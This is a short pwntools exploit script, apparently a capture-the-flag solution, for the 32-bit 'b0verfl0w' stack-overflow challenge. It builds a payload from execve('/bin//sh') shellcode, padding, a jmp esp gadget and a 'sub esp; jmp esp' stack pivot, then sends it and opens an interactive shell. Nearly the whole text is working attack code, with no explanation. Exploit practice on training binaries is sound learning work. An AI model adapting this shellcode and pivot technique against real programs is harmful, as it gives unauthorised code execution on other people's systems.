#Made by fly_autumn
#x86 stack pivoting
from pwn import *
p = process("./b0verfl0w")
elf = ELF("./b0verfl0w")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"

jmp_esp = 0x08048504
sub_jmp_esp = asm('sub esp, 0x28;jmp esp')
payload = bytes(shellcode) + (0x20-len(shellcode))*b"b" + b"bbbb" + p32(jmp_esp) + sub_jmp_esp
p.sendline(payload)

p.interactive()
